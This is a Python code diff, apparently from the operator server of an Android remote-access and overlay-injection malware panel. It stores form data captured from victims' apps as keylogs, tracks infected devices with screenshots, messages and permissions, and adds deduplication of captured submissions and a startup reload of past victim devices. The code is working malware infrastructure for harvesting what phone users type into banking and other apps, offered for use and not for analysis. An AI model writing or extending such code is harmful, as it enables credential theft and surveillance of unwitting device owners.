@@ -890,6 +890,23 @@ def _store_injection(dev, pkg, tpl, data, src='http'):
         text = json.dumps(data, ensure_ascii=False)
     else:
         text = str(data or '')
+
+    # 去重：同一个页面的同一条内容会被上报两次
+    #   ① 模板 HTML 自己 POST /api/inj/result
+    #   ② 原生桥 Android.returnResult / FKB.setFormData → 又 POST 一次
+    # 15 秒内 (deviceId, pkg, text) 完全相同就只保留第一条。
+    try:
+        _now = int(time.time())
+        for _r in reversed((_ai.S.get('inj_records') or [])[-50:]):
+            if (str(_r.get('deviceId') or '') == dev
+                    and str(_r.get('package') or '') == pkg
+                    and str(_r.get('data') or '') == text[:4000]
+                    and _now - int(_r.get('ts') or 0) <= 15):
+                print('[inj] 去重跳过（15s 内同内容）pkg=%s src=%s' % (pkg, src), flush=True)
+                return False
+    except Exception as e:
+        print('[inj] 去重检查失败: %s' % e, flush=True)
+
     try:
         _ai.h_keylogs_add({'deviceId': dev, 'pkg': pkg, 'type': 'form', 'text': text}, {}, 'device')
         if pkg:
@@ -1394,6 +1411,41 @@ def device_rows(src=None):
             'extra': {'deviceInfo': info, 'permissions': granted, 'adb': adb},
         })
     return out
+
+
+def _preload_devices_from_db():
+    """启动时把 DB 里的历史设备灌进 STATE，让面板重启后仍能看到设备列表（显示为离线）。
+
+    之前 STATE['devices'] 只由"设备连上来"时 setdefault 创建，
+    服务一重启面板就变成"0 台设备"，看起来像设备丢了。
+    """
+    try:
+        import api_impl as _ai
+        dbh = _ai.db()
+        if not dbh:
+            return
+        rows = dbh.list_devices() or []
+        for r in rows:
+            dev = r.get('device_id') or r.get('deviceId')
+            if not dev or dev in STATE['devices']:
+                continue
+            try:
+                caps = json.loads(r.get('caps') or '{}')
+            except Exception:
+                caps = {}
+            if isinstance(caps, list):        # 老数据里 caps 是列表
+                caps = {'permissions': {'granted': caps}}
+            STATE['devices'][dev] = {
+                'ws': None, 'relay_ws': None, 'apkid': r.get('apk_id'),
+                'last_seen': r.get('last_seen') or 0,
+                'first_seen': r.get('first_seen') or 0,
+                'caps': caps, 'shots': [], 'msgs': [], 'frames': [],
+                'battery': r.get('battery'), 'model': r.get('model'), 'brand': r.get('brand'),
+                'offline_hint': True,
+            }
+        print('[boot] preload devices from db: %d (total %d)' % (len(rows), len(STATE['devices'])), flush=True)
+    except Exception as e:
+        print('[boot] preload devices failed: %s' % e, flush=True)
 
 
 def mount_full_surface(app):
@@ -2424,6 +2476,7 @@ def build_app():
     except Exception as e:
         print('[server] 私有端点挂载失败：%s' % e)
     mount_full_surface(app)
+    _preload_devices_from_db()
 
     async def health(_r):
         return web.json_response({'ok': True, 'uptime': int(time.time() - BOOT_TS),
